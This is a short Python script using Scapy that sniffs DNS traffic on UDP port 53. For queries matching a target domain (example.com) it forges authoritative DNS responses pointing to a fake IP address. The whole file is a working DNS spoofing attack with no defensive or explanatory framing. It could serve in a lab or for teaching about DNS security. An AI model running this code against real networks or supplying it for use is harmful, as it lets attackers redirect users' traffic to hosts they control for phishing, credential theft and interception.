from scapy.all import *
import socket

# Target domain to spoof and the fake IP address
target_domain = b"example.com"  # Ensure this is in bytes
fake_ip = "5.5.5.5"

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        # Extract the requested domain
        requested_domain = packet[DNSQR].qname

        # Log the intercepted request
        print(f"[+] Intercepted DNS request for: {requested_domain.decode()}")

        # Check if the requested domain matches the target
        if target_domain in requested_domain:
            print(f"[!] Spoofing response for {requested_domain.decode()} to {fake_ip}")

            # Create a fake DNS response packet
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(id=packet[DNS].id,
                              qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=requested_domain, rdata=fake_ip))

            # Send the spoofed response
            send(spoofed_pkt, verbose=0)
            print("[*] Spoofed DNS response sent!")

# Start sniffing for DNS packets on UDP port 53
print("[*] Listening for DNS requests...")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
